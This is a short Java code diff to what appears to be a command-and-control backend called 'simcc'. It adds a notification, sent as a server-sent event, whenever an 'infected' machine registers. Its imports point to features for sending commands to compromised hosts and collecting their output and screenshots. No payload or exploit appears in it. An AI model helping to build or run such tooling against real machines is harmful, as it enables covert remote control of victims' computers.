@@ -5,6 +5,7 @@ import at.simcc.simcc_backend.api.body.InfectedRegistrationRequest;
 import at.simcc.simcc_backend.api.body.ScreenshotResponse;
 import at.simcc.simcc_backend.api.service.InfectedService;
 import at.simcc.simcc_backend.api.sse.InfectedSSEComponent;
+import at.simcc.simcc_backend.api.sse.InfectedStatusChangeEvent;
 import at.simcc.simcc_backend.api.ws.payload.CommandOutputPayload;
 import at.simcc.simcc_backend.api.ws.payload.CommandPayload;
 import at.simcc.simcc_backend.models.InfectedIdDto;
@@ -75,6 +76,10 @@ public class InfectedController {
         }
 
         Optional<InfectedIdDto> infectedId = infectedService.registerInfected(req, parsedIP);
+
+        infectedId.ifPresent(infectedIdDto -> infectedSSEComponent.publish(
+                new InfectedStatusChangeEvent(infectedIdDto.iid(), true)
+        ));
         return ResponseEntity.of(infectedId);
 
     }
